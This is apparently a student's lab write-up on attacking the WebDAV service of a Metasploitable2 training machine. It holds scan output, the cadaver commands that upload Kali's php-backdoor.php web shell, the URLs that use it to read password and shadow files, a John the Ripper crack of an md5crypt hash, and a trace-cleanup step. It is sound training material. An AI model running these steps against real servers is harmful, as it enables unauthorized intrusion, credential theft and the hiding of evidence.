
# Metasploitable: Targetting Port 80

Week 5 Discussion  
Target IpAddress 10.2.2.100  
Target Port: 80, http  

**Objectives:**
1. In redteam folder > student folder > get contents of mypass.txt
2. Get student password hash and crack it using JtR or other tool

Outline; Table-of-Contents:

1. [PHASE 1: RECON](#phase-1-recon)
   - What's in the browser?

2. [PHASE 2: SCANNING](#phase-2-scanning)
   - Scanning the target with `nmap`
   - [Targeting WebDAV](#targetting-webdav)
   - WebDAV (Web-based Distributed Authoring and Versioning) explanation
   - Scanning for the WebDAV folder
     - `Nikto`
     - `davtest`
   - Using `OWASP-ZAP` to scan for the WebDAV folder
   - [Using davtest](#using-davtest)
   - Testing WebDAV with davtest
      - Automatic cleanup
   - [Uploading Files to the dav Directory Folder](#uploading-files-to-the-dav-directory-folder)
   - Introduction to uploading files
   - Using `cadaver` to upload a file

3. [PHASE 3: GAINING ACCESS](#phase-3-gaining-access)
   - Overview of Gaining Access phase
   - Using `php-backdoor.php` web shell
   - Completing Objectives
     - Objective 1
     - Objective 2

4. [PHASE 4: CLEANUP](#phase-4-cleanup)
   - Cleaning up the trail



## PHASE 1: RECON

By visiting the IpAddress, we can see the target machine is hosting a webserver: 

![webserver](image-2.png)


## PHASE 2: SCANNING

Scanning the target with nmap


```
nmap -p 80 -T4 -A -v <ipaddress>
```

Result:
```bash
oot@kali:~# nmap -p 80 -T4 -A -v 10.2.2.100
Starting Nmap 7.70 ( https://nmap.org ) at 2023-09-23 16:15 EDT
NSE: Loaded 148 scripts for scanning.
#...<snipped for brevity>...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
MAC Address: 00:0C:29:30:E1:15 (VMware)
#...<snipped for brevity>...
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds
           Raw packets sent: 21 (1.670KB) | Rcvd: 17 (1.382KB)
```

The information you've obtained from your Nmap scan reveals important details about the web server running on the target system:

1. **Server Software**: "Apache httpd 2.2.8" indicates that the web server software is Apache HTTP Server, commonly known as Apache. The version number, in this case, is 2.2.8. Apache is one of the most popular and widely used web server software applications globally.

2. **Operating System**: "((Ubuntu)" suggests that the web server is running on an Ubuntu-based operating system. Specifically, it's running on an Ubuntu server that has Apache installed. This information can be useful for understanding the server's environment and potential vulnerabilities associated with the operating system.

3. **DAV/2**: "DAV/2" indicates that the server supports WebDAV (Web Distributed Authoring and Versioning) protocol version 2. WebDAV is an extension to the HTTP protocol that allows for collaborative editing and management of files on a web server. This could be significant if you're assessing the server's security, as WebDAV configurations can introduce specific security considerations.

Knowing the server software, version, and operating system is valuable for both security assessments and general server administration. It helps you identify potential vulnerabilities, apply security patches, and ensure that your server is properly configured and up to date. Additionally, understanding that the server supports WebDAV could lead to further assessment regarding its configuration and security.

### Targetting WebDAV

WebDAV (Web-based Distributed Authoring and Versioning) is an extension to the HTTP protocol that enables collaborative editing and remote management of files on web servers. It allows users to create, modify, and delete files and directories on a web server, making it useful for remote file access and management. However, WebDAV can introduce security vulnerabilities if not configured and secured properly. Some common attack vulnerabilities associated with WebDAV include unauthorized access, data leakage, and denial-of-service attacks. These vulnerabilities can be mitigated by implementing proper authentication, access controls, encryption, and regular security audits to ensure the safe and secure use of WebDAV in web applications and services.

First challenge is to find the a webDAV folder on the webserver and test if we can manipulate or view files on the server.

### Scanning for the webDAV folder

1. Nikto
2. davtest

**Nikto**

Nikto is an open-source web server scanner and vulnerability assessment tool designed to help identify security issues and vulnerabilities in web servers, web applications, and websites. It is widely used by security professionals, penetration testers, and system administrators to assess the security posture of web servers and web applications.

```bash
root@kali:~# nikto -h http://10.2.2.100
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.2.2.100
+ Target Hostname:    10.2.2.100
+ Target Port:        80
+ Start Time:         2023-09-23 12:01:36 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3268: /doc/: Directory indexing found.
+ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 12:24:00 2008
+ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /test/: Directory indexing found.
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
^_+ /phpMyAdmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8700 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2023-09-23 12:01:53 (GMT-4) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 
```

**davtest**

Davtest is a command-line tool specifically designed for testing WebDAV configurations and security vulnerabilities. It focuses on identifying weaknesses related to the WebDAV protocol, such as unauthorized access, misconfigurations, and potential vulnerabilities in WebDAV-enabled servers. Davtest is commonly used by security professionals and penetration testers to assess the security of web servers and applications that support WebDAV functionality.

```bash
@kali:~# davtest -url http://10.2.2.100
********************************************************
 Testing DAV connection
OPEN		FAIL:	http://10.2.2.100	Operation failed. You can only open a collection (directory)

root@kali:~# davtest -url http://10.2.2.100/webdav
********************************************************
 Testing DAV connection
OPEN		FAIL:	http://10.2.2.100/webdav	Server response: 405 Method Not Allowed

root@kali:~# davtest -url http://10.2.2.100/davserver
********************************************************
 Testing DAV connection
OPEN		FAIL:	http://10.2.2.100/davserver	Server response: 405 Method Not Allowed
root@kali:~# 
```

Neither `nikto` nor `davtest` revealed the path for the webDAV folder on the server. But we're close. Let's try using OWASP-ZAP.  

### Using OWASP-ZAP to scan for vulnerabilities 

OWASP ZAP (Zed Attack Proxy) is an open-source security testing tool used for finding vulnerabilities in web applications during development and testing phases. It is designed to help identify and mitigate security risks, including cross-site scripting (XSS), SQL injection, and other common web application vulnerabilities. ZAP provides a user-friendly interface for manual testing as well as automation capabilities for running security scans and tests against web applications. It is a widely used tool among security professionals and developers to ensure the security and resilience of web applications against potential attacks.

Start OWASP-ZAP by going to Applications > 03 - Web Application Analysis > owasp-zap

Once the application is open, type in the target machine webserver address: `http://10.2.2.100` and click the `Attack`` button

![Alt text](image-5.png)

While the attack is happening, watch the left site Sites window, expand Sites, and look for the webDAV folder.

![Alt text](image-8.png)

Click the Request tab to view the GET request with the web address: 

![Alt text](image-9.png)

In this case, the webDAV folder appears to be `http://10.2.2.100/dav/`

### Using davtest

Now we can try `davtest` again see if the target webserver is vulnerable to webDAV exploits

```bash
oot@kali:~# davtest -url http://10.2.2.100/dav
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.2.2.100/dav
********************************************************
NOTE	Random string for this session: QzgIO5u
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.2.2.100/dav/DavTestDir_QzgIO5u
********************************************************
 Sending test files
PUT	cfm	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.cfm
PUT	jsp	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.jsp
PUT	jhtml	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.jhtml
PUT	aspx	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.aspx
PUT	shtml	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.shtml
PUT	html	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.html
PUT	pl	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.pl
PUT	asp	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.asp
PUT	txt	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.txt
PUT	php	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.php
PUT	cgi	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.cgi
********************************************************
 Checking for test file execution
EXEC	cfm	FAIL
EXEC	jsp	FAIL
EXEC	jhtml	FAIL
EXEC	aspx	FAIL
EXEC	shtml	FAIL
EXEC	html	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.html
EXEC	pl	FAIL
EXEC	asp	FAIL
EXEC	txt	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.txt
EXEC	php	SUCCEED:	http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.php
EXEC	cgi	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.2.2.100/dav/DavTestDir_QzgIO5u
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.cfm
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.jsp
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.jhtml
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.aspx
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.shtml
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.html
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.pl
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.asp
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.txt
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.php
PUT File: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.cgi
Executes: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.html
Executes: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.txt
Executes: http://10.2.2.100/dav/DavTestDir_QzgIO5u/davtest_QzgIO5u.php

```

The output from the `davtest` command indicates the results of testing a WebDAV-enabled server at `http://10.2.2.100/dav`. Here's a summary of the findings:

1. **Testing DAV Connection**: The initial connection to the WebDAV server was successful.

2. **Creating Directory**: The tool successfully created a directory named "DavTestDir_QzgIO5u" on the server.

3. **Sending Test Files**: Test files with various extensions (e.g., .cfm, .jsp, .php) were successfully uploaded to the created directory.

4. **Checking for Test File Execution**:
   - The tool attempted to execute the uploaded files with various extensions (e.g., .cfm, .jsp, .php).
   - Execution attempts for several file types (e.g., .cfm, .jsp, .aspx) failed.
   - Execution attempts for .html, .txt, and .php files succeeded, and the URLs where they can be executed were provided in the output.

Overall, this `davtest` session indicates that the tested WebDAV server allows file uploads and the execution of certain file types, specifically .html, .txt, and .php files, which may have security implications depending on the server's configuration and purpose. Further assessment and security hardening may be necessary to address potential vulnerabilities.

#### Cleanup

Tip: Use the cleanup flag. 

```bash
davtest -url http://10.2.2.100/dav -cleanup
```

Be mindful of the trail and breadcrumbs left behind during Pentesting.  

davtest generates several files during testing which will be visible on the target filesystem `/var/www/dav/`

![Alt text](image-11.png) 


The files will be visible on the webserver as well.  

![Alt text](image-13.png)

using the `davtest -url <url> -cleanup` flag ensures a cleaner exit. 

![Alt text](image-14.png)

### Uploading files to the dav directory folder

`cadaver` is a command-line WebDAV client for Linux and Unix-like operating systems. It allows users to interact with WebDAV-enabled servers, making it useful for managing files and directories on remote web servers that support the WebDAV protocol.

Since we've determined it's possible to upload files to the webserver dav folder, let's test if we can use cadaver to upload a test file, `badfile.php`

```bash
root@kali:~# nano badfile.php
root@kali:~# cat badfile.php
bad file php

root@kali:~# cadaver http://10.2.2.100/dav
dav:/dav/> put badfile.php badfile.php
Uploading badfile.php to `/dav/badfile.php':
Progress: [=============================>] 100.0% of 14 bytes succeeded.
```

And we can verify that it's been successfully uploaded:

![Alt text](image-15.png)

## PHASE 3: GAINING ACCESS

Finally, we're at a point where we can exploit this vulnerability to achieve our objectives.

We're going to need to gain a "web shell"

A web shell, often referred to simply as a "shell," is a malicious script or program that provides unauthorized access and control over a web server or web application. Web shells are typically uploaded or planted on a target server by attackers who exploit vulnerabilities or weak credentials to gain access. Once deployed, a web shell allows attackers to execute arbitrary commands, interact with the server's file system, and manipulate its resources.

Kali offers several php files that will allow us to obtain a web shell. These files are in `/usr/share/webshells`

```bash
root@kali:~# cd /usr/share/webshells/
root@kali:/usr/share/webshells# ls
asp  aspx  cfm  jsp  perl  php
```

for this exercise, we're interested in the PHP webshell scripts.

```bash
root@kali:/usr/share/webshells# cd php/
root@kali:/usr/share/webshells/php# ls -al
total 52
drwxr-xr-x 2 root root  4096 Sep 22 19:30 .
drwxr-xr-x 8 root root  4096 May 17  2019 ..
-rw-r--r-- 1 root root  4515 Aug 17  2015 findsock.c
-rw-r--r-- 1 root root  2800 Aug 17  2015 php-backdoor.php
-rwxr-xr-x 1 root root  3467 Aug 17  2015 php-findsock-shell.php
-rwxr-xr-x 1 root root  5491 Sep 22 19:30 php-reverse-shell.php
-rw-r--r-- 1 root root 13585 Aug 17  2015 qsd-php-backdoor.php
-rw-r--r-- 1 root root   328 Aug 17  2015 simple-backdoor.php
```

There are several available. Let's see what we can do with `php-backdoor.php`

We're going to need to upload the script using cadaver, then execute the script from the browser. 


```bash
root@kali:/usr/share/webshells/php# cadaver http://10.2.2.100/dav
dav:/dav/> put php-backdoor.php php-backdoor.php
Uploading php-backdoor.php to `/dav/php-backdoor.php':
Progress: [=============================>] 100.0% of 2800 bytes succeeded.
```

Confirmed the file is in the browser:

![Alt text](image-16.png)

Execute by clicking the file. 

![Alt text](image-17.png)

Once the script runs, we're presented with various options. 
- Execute command
- Upload additional files
- Browse directory and files by modifying URL
- Execute mysql queries

From here, we can access the root directory by simply adding `?d=/` at the end of the URL, as per the script's instructions. 

```bash
http://10.2.2.100/dav/php-backdoor.php?d=/
```

After updating the URL, we're presented with a list of files and directories that wouldnt normally be accessible through a browser. From here, each file and folder is a link. 

![Alt text](image-18.png)

### Completing Objectives

Objectives: 
1. In redteam folder > student folder > get contents of mypass.txt
2. Get student password hash and crack it using JtR or other tool

**Objective 1:**

```bash
http://10.2.2.100/dav/php-backdoor.php?f=//redteam2/student2/mypass.txt
```

![Alt text](image-19.png)

```bash
root@kali:~# student2mypass='cmVkdGVhbTJzdHVkZW50Mg=='
root@kali:~# echo $(echo $student2mypass | base64 -d)

redteam2student2

```

**Objective 2:**

(Yes, it's cheating. It's NOT the real /etc/shadow file)

```bash
http://10.2.2.100/dav/php-backdoor.php?f=//redteamlookhere/shadow
```

```text
redteam2student2:$1$1Xz52lbv$nEEUzG4TTbNG3F4/rDyTA.:18557:0:99999:7:::
```

![Alt text](image-20.png)

```bash
root@kali:~# nano student2hashedpw.txt

root@kali:~# cat student2hashedpw.txt 
redteam2student2:$1$1Xz52lbv$nEEUzG4TTbNG3F4/rDyTA.:18557:0:99999:7:::

root@kali:~# john student2hashedpw.txt 

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
No password hashes left to crack (see FAQ)

root@kali:~# john --show student2hashedpw.txt 

redteam2student2:2b:18557:0:99999:7:::

1 password hash cracked, 0 left
```

## PHASE 4: CLEANUP

Go back to the `php-backdoor.php` page and execute `rm *.php` to try and clean up your trail.

![Alt text](image-21.png)

Like nothing happened.

